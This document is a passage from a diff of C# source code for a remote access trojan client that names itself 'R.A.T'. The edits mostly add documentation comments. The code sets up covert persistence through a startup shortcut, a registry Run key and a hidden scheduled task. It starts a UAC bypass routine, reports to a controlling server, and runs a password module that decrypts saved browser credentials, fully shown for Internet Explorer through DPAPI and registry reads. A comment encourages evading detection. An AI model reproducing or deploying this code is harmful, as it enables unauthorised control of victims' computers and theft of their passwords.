+            /// Use the startup folder
+            /// </summary>
             StartUpFolder,
+            /// <summary>
+            /// Use the registry
+            /// </summary>
             Registry,
+            /// <summary>
+            /// Use the TaskScheduler
+            /// </summary>
             TaskScheduler
         }
 
+        /// <summary>
+        /// Probe the startup
+        /// </summary>
+        /// <param name="pm">The mthod to use</param>
         public void ProbeStart(ProbeMethod pm)
         {
-            if (pm == ProbeMethod.StartUpFolder)
+            if (pm == ProbeMethod.StartUpFolder) //Probe starup folder
             {
-                string suFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+                string suFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup); //Get the path of the startup folder
                 string linkFile = suFolder + "\\" + "client.lnk"; //Be creative if you want to get away with it :)
-                if (!File.Exists(linkFile)) CreateShortcut(linkFile, Application.ExecutablePath);
+                if (!File.Exists(linkFile)) CreateShortcut(linkFile, Application.ExecutablePath); //Create the new link file
             }
-            else if (pm == ProbeMethod.Registry)
+            else if (pm == ProbeMethod.Registry) //Probe the registry
             {
-                if (!IsAdmin())
+                if (!IsAdmin()) //Check if client is admin
                 {
-                    Program.reportError(Program.errorType.ADMIN_REQUIRED, "Failed to probe registry", "R.A.T is not running as admin! You can try to bypass the uac or use the startup folder method!");
-                    return;
+                    //Report error to the server
+                    Program.ReportError(Program.ErrorType.ADMIN_REQUIRED, "Failed to probe registry", "R.A.T is not running as admin! You can try to bypass the uac or use the startup folder method!");
+                    return; //Return
                 }
-                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run", true);
-                if (key.GetValue("tut_client") != null) key.DeleteValue("tut_client", false);
-                key.SetValue("tut_client", Application.ExecutablePath);
+                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run", true); //Get the usual registry key
+                if (key.GetValue("tut_client") != null) key.DeleteValue("tut_client", false); //Check and remove value
+                key.SetValue("tut_client", Application.ExecutablePath); //Add the new value
+                //Close and dispose the key
                 key.Close();
                 key.Dispose();
                 key = null;
             }
-            else if (pm == ProbeMethod.TaskScheduler)
+            else if (pm == ProbeMethod.TaskScheduler) //Probe TaskScheduler
             {
-                if (!IsAdmin())
+                if (!IsAdmin()) //Check if client is admin
                 {
-                    Program.reportError(Program.errorType.ADMIN_REQUIRED, "Failed to probe Task Scheduler", "R.A.T is not running as admin! You can try to bypass the uac or use the startup folder method!");
-                    return;
+                    //Report error to the server
+                    Program.ReportError(Program.ErrorType.ADMIN_REQUIRED, "Failed to probe Task Scheduler", "R.A.T is not running as admin! You can try to bypass the uac or use the startup folder method!");
+                    return; //Return
                 }
-                Process deltask = new Process();
-                Process addtask = new Process();
-                deltask.StartInfo.FileName = "cmd.exe";
-                deltask.StartInfo.Arguments = "/c schtasks /Delete tut_client /F";
-                deltask.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                deltask.Start();
-                deltask.WaitForExit();
+                Process deltask = new Process(); //Delete previous task
+                Process addtask = new Process(); //Create the new task
+                deltask.StartInfo.FileName = "cmd.exe"; //Execute the cmd
+                deltask.StartInfo.Arguments = "/c schtasks /Delete tut_client /F"; //Set tasksch command
+                deltask.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; //Hidden process
+                deltask.Start(); //Delete the task
+                deltask.WaitForExit(); //Wait for it to finish
                 Console.WriteLine("Delete Task Completed");
-                addtask.StartInfo.FileName = "cmd.exe";
-                addtask.StartInfo.Arguments = "/c schtasks /Create /tn tut_client /tr \"" + Application.ExecutablePath + "\" /sc ONLOGON /rl HIGHEST";
-                addtask.Start();
-                addtask.WaitForExit();
+                addtask.StartInfo.FileName = "cmd.exe"; //Execute the cmd
+                addtask.StartInfo.Arguments = "/c schtasks /Create /tn tut_client /tr \"" + Application.ExecutablePath + "\" /sc ONLOGON /rl HIGHEST"; //Set tasksch command
+                addtask.Start(); //Add the new task
+                addtask.WaitForExit(); //Wait for it to finish
                 Console.WriteLine("Task created successfully!");
             }
         }
 
+        /// <summary>
+        /// Check if client is running elevated
+        /// </summary>
+        /// <returns>True if client is elevated, otherwise false</returns>
         public bool IsAdmin()
         {
-            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
-            var principal = new System.Security.Principal.WindowsPrincipal(identity);
-            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+            var identity = System.Security.Principal.WindowsIdentity.GetCurrent(); //Get my identity
+            var principal = new System.Security.Principal.WindowsPrincipal(identity); //Get my principal
+            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator); //Check if i'm an elevated process
         }
 
+        /// <summary>
+        /// Check if the system is x64
+        /// </summary>
+        /// <returns>True if system is x64, otherwise false</returns>
         private bool Is64Bit()
         {
-            return Environment.Is64BitOperatingSystem;
+            return Environment.Is64BitOperatingSystem; //Return the x64 state
         }
 
+        /// <summary>
+        /// Close the current client
+        /// </summary>
         private void CloseInstance()
         {
-            Process self = Process.GetCurrentProcess();
-            self.Kill();
+            Process self = Process.GetCurrentProcess(); //Get my process
+            self.Kill(); //Stop the current client
         }
 
+        /// <summary>
+        /// Try to bypass the UAC
+        /// </summary>
+        /// <returns>True if bypass is successful</returns>
         public bool BypassUAC()
         {
+            //Declare key file names
             const string dismCoreDll = "dismcore.dll";
             const string copyFile = "copyFile.exe";
             const string unattendFile = "unattend.xml";
@@ -2042,32 +2482,115 @@ namespace TutClient
         }
     }
 
-    public class passwordManager
+    /// <summary>
+    /// The password recovery module
+    /// </summary>
+    public class PasswordManager
     {
-
+        /// <summary>
+        /// Find a window
+        /// </summary>
+        /// <param name="lpClassName">The class name of the window</param>
+        /// <param name="lpWindowName">The title of the window</param>
+        /// <returns>The handle of the window</returns>
         [DllImport("user32.dll", SetLastError = true)]
         static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+        /// <summary>
+        /// Find a child window
+        /// </summary>
+        /// <param name="hwndParent">The handle of the parent window</param>
+        /// <param name="hwndChildAfter">The handle of the child window to return the child window after</param>
+        /// <param name="lpszClass">The class of the window</param>
+        /// <param name="lpszWindow">The title of the window</param>
+        /// <returns>The handle of the child window</returns>
         [DllImport("user32.dll", SetLastError = true)]
         static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);
+        /// <summary>
+        /// Send message to a window
+        /// </summary>
+        /// <param name="hWnd">Handle of the target window</param>
+        /// <param name="Msg">The code of the message to send to <see cref="hWnd"/></param>
+        /// <param name="wParam">WParameter of the command</param>
+        /// <param name="lParam">LParameter of the command</param>
+        /// <returns>The result of the command</returns>
         [DllImport("user32.dll", CharSet = CharSet.Ansi)]
         private static extern IntPtr SendMessageA(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);
+        /// <summary>
+        /// Open a process
+        /// </summary>
+        /// <param name="processAccess">The access to open the process with</param>
+        /// <param name="bInheritHandle">True if you want to inherit the handle</param>
+        /// <param name="processId">The ID of the process to open</param>
+        /// <returns>The handle of the opened process</returns>
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
+        /// <summary>
+        /// Allocate memory
+        /// </summary>
+        /// <param name="hProcess">The handle of the process to allocate memory in</param>
+        /// <param name="lpAddress">The address of the memory to allocate</param>
+        /// <param name="dwSize">The size of the memory to allocate</param>
+        /// <param name="flAllocationType">Memory allocation type</param>
+        /// <param name="flProtect">Memory protection</param>
+        /// <returns>A pointer to the allocated space</returns>
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
+        /// <summary>
+        /// Write to memory
+        /// </summary>
+        /// <param name="hProcess">The process to write the memory of</param>
+        /// <param name="lpBaseAddress">The address of the memory to write</param>
+        /// <param name="lpBuffer">The buffer to write to the memory</param>
+        /// <param name="nSize">The size of the <see cref="lpBuffer"/></param>
+        /// <param name="lpNumberOfBytesWritten">A pointer to the number of written bytes</param>
+        /// <returns>The result of the write</returns>
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, UInt32 nSize, UIntPtr lpNumberOfBytesWritten);
+        /// <summary>
+        /// Read the memory
+        /// </summary>
+        /// <param name="hProcess">The process to read the memory of</param>
+        /// <param name="lpBaseAddress">The address of the memory to read</param>
+        /// <param name="lpBuffer">The buffer to read the data to</param>
+        /// <param name="dwSize">The size of the data to read</param>
+        /// <param name="lpNumberOfBytesRead">Pointer to the number of written bytes</param>
+        /// <returns>The result of the action</returns>
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+        /// <summary>
+        /// Free an allocated memory space
+        /// </summary>
+        /// <param name="hProcess">The process to free memory of</param>
+        /// <param name="lpAddress">The address of the memory to free</param>
+        /// <param name="dwSize">The size of the memory to free</param>
+        /// <param name="dwFreeType">The type of the free operation</param>
+        /// <returns>The result of the free</returns>
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, FreeType dwFreeType);
+        /// <summary>
+        /// Close a process handle
+        /// </summary>
+        /// <param name="hObject">The handle of the process</param>
+        /// <returns>The result of the close</returns>
         [DllImport("kernel32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         static extern bool CloseHandle(IntPtr hObject);
 
+        /// <summary>
+        /// Window code to the base of ListView control calls
+        /// </summary>
         private const int LVM_FIRST = 0x1000;
+        /// <summary>
+        /// Window code to getting the number of items in a <see cref="ListView"/> control
+        /// </summary>
         private const int LVM_GETITEMCOUNT = LVM_FIRST + 4;
-        private const int LVM_GETITEM = LVM_FIRST + 115;//LVM_FIRST + 45;
+        /// <summary>
+        /// Window code to getting an item from a <see cref="ListView"/> control
+        /// </summary>
+        private const int LVM_GETITEM = LVM_FIRST + 115;
+        /// <summary>
+        /// <see cref="ListViewItem"/> get text mask value
+        /// </summary>
         private const int LVIF_TEXT = 0x0001;
         private const int ffprColumn = 13;
         private const int gcprColumn = 7;
@@ -2076,81 +2599,237 @@ namespace TutClient
         private const int gcprLvid = 0;
         private const int ieprLvid = 0;
 
+        /// <summary>
+        /// Memory protection actions
+        /// </summary>
         public enum MemoryProtection
         {
+            /// <summary>
+            /// Execute Only
+            /// </summary>
             Execute = 0x10,
+            /// <summary>
+            /// Execute and Read
+            /// </summary>
             ExecuteRead = 0x20,
+            /// <summary>
+            /// Execute, Read and Write
+            /// </summary>
             ExecuteReadWrite = 0x40,
+            /// <summary>
+            /// Execute, Write and Copy
+            /// </summary>
             ExecuteWriteCopy = 0x80,
+            /// <summary>
+            /// No access to memory
+            /// </summary>
             NoAccess = 0x01,
+            /// <summary>
+            /// Read Only
+            /// </summary>
             ReadOnly = 0x02,
+            /// <summary>
+            /// Read and Write
+            /// </summary>
             ReadWrite = 0x04,
+            /// <summary>
+            /// Write and Copy
+            /// </summary>
             WriteCopy = 0x08,
+            /// <summary>
+            /// Modify the guard
+            /// </summary>
             GuardModifierflag = 0x100,
+            /// <summary>
+            /// Modify the caching
+            /// </summary>
             NoCacheModifierflag = 0x200,
+            /// <summary>
+            /// Modify the combined writing
+            /// </summary>
             WriteCombineModifierflag = 0x400
         }
 
+        /// <summary>
+        /// Memory allocation types
+        /// </summary>
         public enum AllocationType
         {
+            /// <summary>
+            /// Commit memory
+            /// </summary>
             Commit = 0x1000,
+            /// <summary>
+            /// Reserver the space
+            /// </summary>
             Reserve = 0x2000,
+            /// <summary>
+            /// Decommit memory
+            /// </summary>
             Decommit = 0x4000,
+            /// <summary>
+            /// Release the space
+            /// </summary>
             Release = 0x8000,
+            /// <summary>
+            /// Reset memory space
+            /// </summary>
             Reset = 0x80000,
+            /// <summary>
+            /// Physical allocation
+            /// </summary>
             Physical = 0x400000,
+            /// <summary>
+            /// Top Down allocation
+            /// </summary>
             TopDown = 0x100000,
+            /// <summary>
+            /// Write Watch Allocation
+            /// </summary>
             WriteWatch = 0x200000,
+            /// <summary>
+            /// Large Pages allocation
+            /// </summary>
             LargePages = 0x20000000
         }
 
-        [StructLayoutAttribute(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        /// <summary>
+        /// c++ <see cref="ListViewItem"/>struct
+        /// </summary>
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
         private struct LVITEM
         {
+            /// <summary>
+            /// Mask of the item
+            /// </summary>
             public uint mask;
+            /// <summary>
+            /// Index of the item
+            /// </summary>
             public int iItem;
+            /// <summary>
+            /// Index of the subitem
+            /// </summary>
             public int iSubItem;
+            /// <summary>
+            /// The state of the item
+            /// </summary>
             public uint state;
+            /// <summary>
+            /// The state mask of the item
+            /// </summary>
             public uint stateMask;
+            /// <summary>
+            /// Pointer to the text of the item
+            /// </summary>
             public IntPtr pszText;
+            /// <summary>
+            /// The size of the text of the item
+            /// </summary>
             public int cchTextMax;
+            /// <summary>
+            /// The image code of the item
+            /// </summary>
             public int iImage;
+            /// <summary>
+            /// The LParam of the item
+            /// </summary>
             public IntPtr lParam;
         }
+
+        /// <summary>
+        /// Process Desired Access Codes
+        /// </summary>
         public enum ProcessAccessFlags : uint
         {
+            /// <summary>
+            /// Request all access
+            /// </summary>
             All = 0x001F0FFF,
+            /// <summary>
+            /// Only terminate process
+            /// </summary>
             Terminate = 0x00000001,
+            /// <summary>
+            /// Create a thread in the process
+            /// </summary>
             CreateThread = 0x00000002,
+            /// <summary>
+            /// Do Memory Operations on the process
+            /// </summary>
             VirtualMemoryOperation = 0x00000008,
+            /// <summary>
+            /// Only read memory of the process
+            /// </summary>
             VirtualMemoryRead = 0x00000010,
+            /// <summary>
+            /// Only write memory of the process
+            /// </summary>
             VirtualMemoryWrite = 0x00000020,
+            /// <summary>
+            /// Duplicate the handle of the process
+            /// </summary>
             DuplicateHandle = 0x00000040,
+            /// <summary>
+            /// Create a child process
+            /// </summary>
             CreateProcess = 0x000000080,
+            /// <summary>
+            /// Set process quota
+            /// </summary>
             SetQuota = 0x00000100,
+            /// <summary>
+            /// Set process information
+            /// </summary>
             SetInformation = 0x00000200,
+            /// <summary>
+            /// Query process information
+            /// </summary>
             QueryInformation = 0x00000400,
+            /// <summary>
+            /// Query limited process infromation
+            /// </summary>
             QueryLimitedInformation = 0x00001000,
+            /// <summary>
+            /// Synchronize the process
+            /// </summary>
             Synchronize = 0x00100000
         }
 
+        /// <summary>
+        /// Free memory allocation options
+        /// </summary>
         public enum FreeType
         {
+            /// <summary>
+            /// Recommit memory
+            /// </summary>
             Decommit = 0x4000,
+            /// <summary>
+            /// Release memory
+            /// </summary>
             Release = 0x8000,
         }
 
         IntPtr vTest;
+        /// <summary>
+        /// Handle of the Firefox decryptor's <see cref="ListView"/>
+        /// </summary>
         IntPtr listView;
 
-        public String[] getSavedPassword()
+        /// <summary>
+        /// Try to get every saved password in the 3 major browsers
+        /// </summary>
+        /// <returns>An array of browser passwords</returns>
+        public String[] GetSavedPassword()
         {
-            List<String> result = new List<String>();
-            String[] gcpw = getGCpw();
-            String[] iepw = getIEpw();
-            String[] ffpw = getFFpw();
-            String formatResult = "";
-            int checkCount = 0;
+            List<String> result = new List<String>(); //The recovery result
+            String[] gcpw = GetGCpw(); //Google Chrome Passwords
+            String[] iepw = GetIEpw(); //Internet Explorer Passwords
+            String[] ffpw = GetFFpw(); //Firefox Passwords
+            String formatResult = ""; //Format the result of the passwords
+            int checkCount = 0; //ID of the checked password
+            //Format and Parse password data
             foreach (String entry in gcpw)
             {
                 if ((checkCount + 1) != gcpw.Length)
@@ -2199,67 +2878,77 @@ namespace TutClient
             formatResult = "";
             checkCount = 0;
 
-            return result.ToArray();
+            return result.ToArray(); //Return the passwords
         }
 
-        public String[] getIEpw()
+        /// <summary>
+        /// Recover Internet Explorer Passwords
+        /// </summary>
+        /// <returns>An array of recovered passwords</returns>
+        public String[] GetIEpw()
         {
-            List<String[]> data = new List<String[]>();
-            List<String> pwresult = new List<String>();
-            UrlHistoryWrapperClass urlHistory;
-            UrlHistoryWrapperClass.STATURLEnumerator enumerator;
-            System.Collections.ArrayList list = new System.Collections.ArrayList();
-            urlHistory = new UrlHistoryWrapperClass();
-            enumerator = urlHistory.GetEnumerator();
-            enumerator.GetUrlHistory(list);
-            foreach (STATURL entry in list)
+            List<String[]> data = new List<String[]>(); //Return value from decryptor
+            List<String> pwresult = new List<String>(); //Recovered password data
+            UrlHistoryWrapperClass urlHistory; //URL History Object
+            UrlHistoryWrapperClass.STATURLEnumerator enumerator; //URL Enumerator Object
+            System.Collections.ArrayList list = new System.Collections.ArrayList(); //URL List
+            urlHistory = new UrlHistoryWrapperClass(); //Create new history object
+            enumerator = urlHistory.GetEnumerator(); //Get the URL enumerator
+            enumerator.GetUrlHistory(list); //Get the History list
+            foreach (STATURL entry in list) //Loop thorugh the history
             {
-                String append = entry.URL;
+                String append = entry.URL; //The URL
                 Console.WriteLine(append);
-                bool result = decryptIEpassword(append, data);
-                if (result == false) data.Clear();
+                bool result = DecryptIEpassword(append, data); //Try to decrypt the passwords
+                if (result == false) data.Clear(); //Failed to decrypt -> empty result
                 if (data.Count == 0)
                 {
                     //Ignore URL
                 }
                 else
                 {
-                    String toAppend = data[0][0] + "§" + data[0][1] + "§" + data[0][2];
-                    pwresult.Add(toAppend);
+                    String toAppend = data[0][0] + "§" + data[0][1] + "§" + data[0][2]; //Craft password data
+                    pwresult.Add(toAppend); //Append to recovered list
                 }
             }
 
-            if (pwresult.Count == 0)
+            if (pwresult.Count == 0) //No recovered passwords
             {
-                pwresult.Add("failed");
+                pwresult.Add("failed"); //Recovery Failed
             }
 
-            return pwresult.ToArray();
+            return pwresult.ToArray(); //Return the recovered passwords
         }
 
-        public const string keystr = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";
+        public const string keystr = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2"; //Registry key to stored passwords
 
-        public bool decryptIEpassword(string url, List<String[]> dataList)
+        /// <summary>
+        /// Try to decrypt passwords using the given url
+        /// </summary>
+        /// <param name="url">The URL to decrypt passwords with</param>
+        /// <param name="dataList">The result object to set</param>
+        /// <returns>True if decrypted password, otherwise false</returns>
+        public bool DecryptIEpassword(string url, List<String[]> dataList)
         {
-            string urlhash = GetURLHashString(url);
-            if (!DoesURLMatchWithHash(urlhash)) return false;
+            string urlhash = GetURLHashString(url); //Get the hash of the URL
+            if (!DoesURLMatchWithHash(urlhash)) return false; //Check if Hash exists
             //MessageBox.Show("url match " + url);
-            RegistryKey key = Registry.CurrentUser.OpenSubKey(keystr);
-            if (key == null) return false;
-            //MessageBox.Show("key open");
-            byte[] cypherBytes = (byte[])key.GetValue(urlhash);
-            key.Close();
-            byte[] optionalEntropy = new byte[2 * (url.Length + 1)];
-            Buffer.BlockCopy(url.ToCharArray(), 0, optionalEntropy, 0, url.Length * 2);
-            byte[] decryptedBytes = ProtectedData.Unprotect(cypherBytes, optionalEntropy, DataProtectionScope.CurrentUser);
-            var ieAutoHeader = ByteArrayToStructure<IEAutoCompleteSecretHeader>(decryptedBytes);
-            if (decryptedBytes.Length >= (ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize + ieAutoHeader.dwSecretSize))
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(keystr); //Open the registry passwords location
+            if (key == null) return false; //Return if failed to open the key
+            byte[] cypherBytes = (byte[])key.GetValue(urlhash); //Get the encrypted bytes of the URL
+            key.Close(); //Close the registry key
+            byte[] optionalEntropy = new byte[2 * (url.Length + 1)]; //Decryption key
+            Buffer.BlockCopy(url.ToCharArray(), 0, optionalEntropy, 0, url.Length * 2); //Copy data to the decryption key
+            byte[] decryptedBytes = ProtectedData.Unprotect(cypherBytes, optionalEntropy, DataProtectionScope.CurrentUser); //Decrypt the secret data
+            var ieAutoHeader = ByteArrayToStructure<IEAutoCompleteSecretHeader>(decryptedBytes); //Convert to IE Auto Complete Object
+            if (decryptedBytes.Length >= (ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize + ieAutoHeader.dwSecretSize)) //Check the size of the decrypted data
             {
-                uint dwTotalSecrets = ieAutoHeader.IESecretHeader.dwTotalSecrets / 2;
-                int sizeOfSecretEntry = Marshal.SizeOf(typeof(SecretEntry));
-                byte[] secretsBuffer = new byte[ieAutoHeader.dwSecretSize];
-                int offset = (int)(ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize);
-                Buffer.BlockCopy(decryptedBytes, offset, secretsBuffer, 0, secretsBuffer.Length);
+                uint dwTotalSecrets = ieAutoHeader.IESecretHeader.dwTotalSecrets / 2; //Get the secret data size
+                int sizeOfSecretEntry = Marshal.SizeOf(typeof(SecretEntry)); //Get the size of the secret object
+                byte[] secretsBuffer = new byte[ieAutoHeader.dwSecretSize]; //Create buffer for secret data
+                int offset = (int)(ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize); //Secret data offset
+                Buffer.BlockCopy(decryptedBytes, offset, secretsBuffer, 0, secretsBuffer.Length); //Copy data to the secrets buffer
+                //Purge the result list
                 if (dataList == null)
                 {
                     dataList = new List<string[]>();
@@ -2268,88 +2957,108 @@ namespace TutClient
                 {
                     dataList.Clear();
                 }
-                offset = Marshal.SizeOf(ieAutoHeader);
-                for (int i = 0; i < dwTotalSecrets; i++)
+                offset = Marshal.SizeOf(ieAutoHeader); //Get the size of the auto complete header
+                for (int i = 0; i < dwTotalSecrets; i++) //Go through the secrets
                 {
-                    byte[] secEntryBuffer = new byte[sizeOfSecretEntry];
-                    Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length);
-                    SecretEntry secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer);
-                    String[] dataTriplets = new String[3];
-                    byte[] secret1 = new byte[secEntry.dwLength * 2];
-                    Buffer.BlockCopy(secretsBuffer, (int)secEntry.dwOffset, secret1, 0, secret1.Length);
-                    dataTriplets[0] = Encoding.Unicode.GetString(secret1);
-                    offset += sizeOfSecretEntry;
-                    Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length);
-                    secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer);
-                    byte[] secret2 = new byte[secEntry.dwLength * 2];
-                    Buffer.BlockCopy(secretsBuffer, (int)secEntry.dwOffset, secret2, 0, secret2.Length);
-                    dataTriplets[1] = Encoding.Unicode.GetString(secret2);
-                    dataTriplets[2] = url;
-                    dataList.Add(dataTriplets);
-                    offset += sizeOfSecretEntry;
+                    byte[] secEntryBuffer = new byte[sizeOfSecretEntry]; //Create buffer for secret data
+                    Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length); //Copy the secret data from the main buffer
+                    SecretEntry secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer); //Convert to Secret Entry
+                    String[] dataTriplets = new String[3]; //For storing the results
+                    byte[] secret1 = new byte[secEntry.dwLength * 2]; //Get the first secret data
+                    Buffer.BlockCopy(secretsBuffer, (int)secEntry.dwOffset, secret1, 0, secret1.Length); //Copy the first secret from the secrets buffer
+                    dataTriplets[0] = Encoding.Unicode.GetString(secret1); //Set the result Username
+                    offset += sizeOfSecretEntry; //Add this entry to the offset
+                    Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length); //Get the next secret
+                    secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer); //Convert the secret to the SecretEntry type
+                    byte[] secret2 = new byte[secEntry.dwLength * 2]; //Create buffer for second secret
+                    Buffer.BlockCopy(secretsBuffer, (int)secEntry.dwOffset, secret2, 0, secret2.Length); //Copy the second secret to the buffer
+                    dataTriplets[1] = Encoding.Unicode.GetString(secret2); //Set the result password
+                    dataTriplets[2] = url; //Set the result url
+                    dataList.Add(dataTriplets); //Add the password to the result list
+                    offset += sizeOfSecretEntry; //Increment the offset
                 }
             }
 
-            return true;
+            return true; //Success, decrypted
         }
 
+        /// <summary>
+        /// Get the hash string of an URL
+        /// </summary>
+        /// <param name="wstrUrl">The url to hash</param>
+        /// <returns>The hash of the given url</returns>
         public String GetURLHashString(string wstrUrl)
         {
-            IntPtr hProv = IntPtr.Zero;
-            IntPtr hHash = IntPtr.Zero;
+            IntPtr hProv = IntPtr.Zero; //Crypto Provider
+            IntPtr hHash = IntPtr.Zero; //The resulting hashing function
 
-            CryptAcquireContext(out hProv, String.Empty, String.Empty, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
-            if (!CryptCreateHash(hProv, ALG_ID.CALG_SHA1, IntPtr.Zero, 0, ref hHash))
+            CryptAcquireContext(out hProv, String.Empty, String.Empty, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT); //Get a new RSA crypto context
+            if (!CryptCreateHash(hProv, ALG_ID.CALG_SHA1, IntPtr.Zero, 0, ref hHash)) //Get SHA1 hasher
                 throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
-            byte[] bytesToCrypt = Encoding.Unicode.GetBytes(wstrUrl);
-            StringBuilder urlhash = new StringBuilder(42);
-            if (CryptHashData(hHash, bytesToCrypt, (uint)(wstrUrl.Length + 1) * 2, 0))
+            byte[] bytesToCrypt = Encoding.Unicode.GetBytes(wstrUrl); //Get the bytes of the URL
+            StringBuilder urlhash = new StringBuilder(42); //The hash of the URL
+            if (CryptHashData(hHash, bytesToCrypt, (uint)(wstrUrl.Length + 1) * 2, 0)) //Hash the URL bytes
             {
-                uint dwHashLen = 20;
-                byte[] buffer = new byte[dwHashLen];
-                if (!CryptGetHashParam(hHash, HashParameters.HP_HASHVAL, buffer, ref dwHashLen, 0))
+                uint dwHashLen = 20; //The length of the hashed value
+                byte[] buffer = new byte[dwHashLen]; //Create a new buffer for the hash
+                if (!CryptGetHashParam(hHash, HashParameters.HP_HASHVAL, buffer, ref dwHashLen, 0)) //Get the hash value
                     throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
                 byte tail = 0;
                 urlhash.Length = 0;
+                //Append the bytes to the final Hash
                 for (int i = 0; i < dwHashLen; i++)
                 {
                     byte c = buffer[i];
                     tail += c;
                     urlhash.AppendFormat("{0:X2}", c);
                 }
-                urlhash.AppendFormat("{0:X2}", tail);
-                CryptDestroyHash(hHash);
+                urlhash.AppendFormat("{0:X2}", tail); //Append the last byte at the end
+                CryptDestroyHash(hHash); //Destroy the Hashing function
             }
-            CryptReleaseContext(hProv, 0);
-            return urlhash.ToString();
+            CryptReleaseContext(hProv, 0); //Release the crypto context
+            return urlhash.ToString(); //Return the url Hash
         }
 
+        /// <summary>
+        /// Checks if the password container has this URL stored
+        /// </summary>
+        /// <param name="urlHash">The hash of the URL</param>
+        /// <returns>True if password is stored for this URL</returns>
         public bool DoesURLMatchWithHash(String urlHash)
         {
-            bool result = false;
-            RegistryKey key = Registry.CurrentUser.OpenSubKey(keystr);
-            if (key == null) return false;
-            String[] values = key.GetValueNames();
-            foreach (String name in values)
+            bool result = false; //Result variable
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(keystr); //Open the password storage
+            if (key == null) return false; //Return false if can't open key
+            String[] values = key.GetValueNames(); //Get every registry key's name
+            foreach (String name in values) //Loop through the keys
             {
-                if (name == urlHash)
+                if (name == urlHash) //If key name matches the hashed url
                 {
-                    result = true;
-                    break;
+                    result = true; //Return true
+                    break; //Break out
                 }
             }
 
-            return result;
+            return result; //Return the result
         }
 
+        /// <summary>
+        /// Convert byte array to a structure
+        /// </summary>
+        /// <typeparam name="T">The type of the struct</typeparam>
+        /// <param name="bytes">The bytes to convert</param>
+        /// <returns>The converted struct</returns>
         public T ByteArrayToStructure<T>(byte[] bytes) where T : struct
         {
-            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
-            T stuff = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
-            handle.Free();
-            return stuff;
+            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned); //Pin the bytes in GC
+            T stuff = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T)); //Convert the bytes to the structure
+            handle.Free(); //Remove the GC Pinning
+            return stuff; //Return the converted struct
         }
 
+        /// <summary>
+        /// Internet Explorer Secret Data Struct
+        /// </summary>
         [StructLayout(LayoutKind.Sequential)]
         struct IESecretInfoHeader
         {
@@ -2361,6 +3070,9 @@ namespace TutClient
             public uint unknownZero;
         };
 
+        /// <summary>
+        /// Internet Explorer Auto Complete Header Struct
+        /// </summary>
         [StructLayout(LayoutKind.Sequential)]
         struct IEAutoCompleteSecretHeader
         {
@@ -2370,6 +3082,9 @@ namespace TutClient
             public IESecretInfoHeader IESecretHeader;
         };
 
+        /// <summary>
+        /// Internet Explorer Secret Entry
+        /// </summary>
         [StructLayout(LayoutKind.Explicit)]
         struct SecretEntry
         {
@@ -2397,239 +3112,416 @@ namespace TutClient
             public uint dwLength;
         };
 
+        /// <summary>
+        /// RSA Provider ID
+        /// </summary>
         private const uint PROV_RSA_FULL = 1;
+        /// <summary>
+        /// Verify context ID
+        /// </summary>
         private const uint CRYPT_VERIFYCONTEXT = 0xF0000000;
+        /// <summary>
+        /// ALG HASH Base ID
+        /// </summary>
         private const int ALG_CLASS_HASH = 4 << 13;
+        /// <summary>
+        /// SHA1 hashing ID
+        /// </summary>
         private const int ALG_SID_SHA1 = 4;
+
+        /// <summary>
+        /// Hashing Algorithms
